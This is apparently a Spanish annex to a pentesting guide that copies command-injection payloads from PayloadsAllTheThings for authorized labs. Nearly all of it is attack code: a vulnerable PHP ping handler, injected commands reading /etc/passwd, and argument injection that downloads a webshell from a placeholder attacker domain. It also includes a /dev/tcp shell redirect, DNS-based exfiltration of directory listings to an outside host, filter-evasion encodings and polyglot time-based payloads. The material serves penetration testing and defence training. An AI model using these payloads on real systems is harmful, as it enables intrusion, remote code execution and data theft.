# Code injection / eval: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Command Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Command%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección de comandos / Metodología

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

### Variantes presentes en tablas o texto del apartado

```text
system()
8.8.8.8; cat /etc/passwd
ping -c 4 8.8.8.8; cat /etc/passwd
ping 8.8.8.8
cat /etc/passwd
/etc/passwd
```

## 2. Metodología / Comandos básicos

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

## 3. Metodología / Encadenamiento de comandos

```powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```

### Variantes presentes en tablas o texto del apartado

```text
;
&&
&
```

## 4. Metodología / Inyección de argumentos

```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
```

```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
```

```ps1
    psql -o'|id>/tmp/foo'
```

```php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

```ps1
    # -o, --output <file>        Write to file instead of stdout
    curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
```

### Variantes presentes en tablas o texto del apartado

```text
＂ --use-askpass=calc ＂
```

## 5. Metodología / Dentro de un comando

```bash
  original_cmd_by_server `cat /etc/passwd`
```

```bash
  original_cmd_by_server $(cat /etc/passwd)
```

## 6. Evasiones de filtros / Evasión Sin espacios

```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
```

```powershell
  {cat,/etc/passwd}
```

```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
```

```powershell
  X=$'uname\x20-a'&&$X
```

```powershell
  ;ls%09-al%09/home
```

```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
```

### Variantes presentes en tablas o texto del apartado

```text
$IFS
${IFS}
09
%VARIABLE:~start,length%
```

## 7. Evasiones de filtros / Evasión Con salto de línea

```bash
original_cmd_by_server
ls
```

## 8. Evasiones de filtros / Evasión Con barra inversa y salto de línea

```powershell
  $ cat /et\
  c/pa\
  sswd
```

```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## 9. Evasiones de filtros / Evasión Con expansión de virgulilla

```powershell
echo ~+
echo ~-
```

## 10. Evasiones de filtros / Evasión Con expansión de llaves

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

## 11. Evasiones de filtros / Evasión Filtro de caracteres

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

## 12. Evasiones de filtros / Evasión Filtro de caracteres mediante hex

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

## 13. Evasiones de filtros / Evasión Con comilla simple

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

## 14. Evasiones de filtros / Evasión Con comilla doble

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

## 15. Evasiones de filtros / Evasión Con Backticks

```powershell
wh``oami
```

## 16. Evasiones de filtros / Evasión Con Backslash and Slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

## 17. Evasiones de filtros / Evasión Con $@

```powershell
who$@ami
echo whoami|$0
```

### Variantes presentes en tablas o texto del apartado

```text
$0
```

## 18. Evasiones de filtros / Evasión Con $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

## 19. Evasiones de filtros / Evasión Con Variable Expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

## 20. Evasiones de filtros / Evasión Con Wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## 21. Evasiones de filtros / Evasión Con Random Case

```powershell
wHoAmi
```

## 22. Datos Extracción de datos / Basada en tiempo Datos Extracción de datos

```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
```

```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
```

## 23. Datos Extracción de datos / Dns Based Datos Extracción de datos

```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

## 24. Inyección de comandos / Polyglot Inyección de comandos

```powershell
  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # Context inside commands with single and double quote:
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

```powershell
  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # Context inside commands with single and double quote:
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

## 25. Trucos / Backgrounding Long Running Commands

```bash
nohup sleep 120 > /dev/null &
```

## 26. Trucos / Remove Arguments After The Inyección

### Variantes presentes en tablas o texto del apartado

```text
--
```

## 27. Labs / Ejercicio

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
